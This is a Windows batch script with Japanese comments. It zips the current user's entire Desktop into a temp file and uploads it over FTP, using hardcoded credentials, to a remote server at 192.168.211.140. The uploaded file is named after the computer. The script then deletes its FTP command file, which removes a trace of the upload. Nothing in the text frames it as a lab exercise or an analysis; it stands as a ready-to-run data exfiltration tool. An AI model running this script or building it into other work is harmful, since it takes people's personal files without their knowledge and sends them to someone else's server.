rem @echo off

rem ZIP形式で圧縮するフォルダ(またはファイル)パスを指定
set targetPath=%USERPROFILE%\Desktop
rem 解凍(展開)先フォルダを指定
set zipFilePath=%TEMP%\data.zip

rem 実行するPowerShellのコマンドレットを組み立て
set psCommand=powershell -NoProfile -ExecutionPolicy Unrestricted Compress-Archive -Path %targetPath% -DestinationPath %zipFilePath% -Force

rem PowerShellのコマンドレットを実行
%psCommand%

setlocal

:: FTPサーバーの情報
set "ftp_server=192.168.211.140"
set "ftp_username=test01"
set "ftp_password=P@ssw0rd"

:: アップロード対象ファイルとローカルの一時ディレクトリ
set "local_file=%TEMP%\data.zip"
set "target_file=data_%COMPUTERNAME%.zip"

:: FTPコマンドを記述した一時スクリプトファイル
set "ftp_script=%TEMP%\ftp_script.txt"

(
echo open %ftp_server%
echo %ftp_username%
echo %ftp_password%
echo binary
echo put "%local_file%" "%target_file%"
echo quit
) > %ftp_script%

:: FTPコマンドの実行
ftp -s:%ftp_script%

:: 一時スクリプトファイルの削除
del %ftp_script%

endlocal
